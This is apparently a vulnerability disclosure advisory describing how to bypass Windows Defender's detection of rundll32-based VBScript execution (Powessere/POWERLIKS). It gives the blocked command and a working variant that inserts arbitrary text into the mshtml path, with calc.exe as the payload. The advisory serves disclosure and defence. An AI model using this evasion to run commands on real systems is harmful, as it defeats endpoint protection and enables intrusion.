[Product]
Windows Defender


[Vulnerability Type]
Windows Defender VBScript Detection Mitigation Bypass
TrojanWin32Powessere.G


[CVE Reference]
N/A


[Security Issue]
Typically, Windows Defender detects and prevents TrojanWin32Powessere.G aka "POWERLIKS" type execution that leverages rundll32.exe. Attempts at execution fail
and attackers will typically get an "Access is denied" error message. Previously I have disclosed 3 bypasses using rundll32 javascript, this example leverages VBSCRIPT and ActiveX engine.

Running rundll32 vbscript:"\\..\\mshtml\\..\\mshtml\\..\\mshtml,RunHTMLApplication "+String(CreateObject("Wscript.Shell").Run("calc.exe"),0), will typically get blocked by Windows Defender with
an "Access is denied" message.

Trojan:Win32/Powessere.G
Category: Trojan
This program is dangerous and executes commands from an attacker.

However, you can add arbitrary text for the 2nd mshtml parameter to build off my previous javascript based bypasses to skirt defender detection.
Example, adding "shtml", "Lol" or other text and it will execute as of the time of this writing.

E.g.

C:\sec>rundll32 vbscript:"\\..\\mshtml\\..\\PWN\\..\\mshtml,RunHTMLApplication "+String(CreateObject("Wscript.Shell").Run("calc.exe"),0)
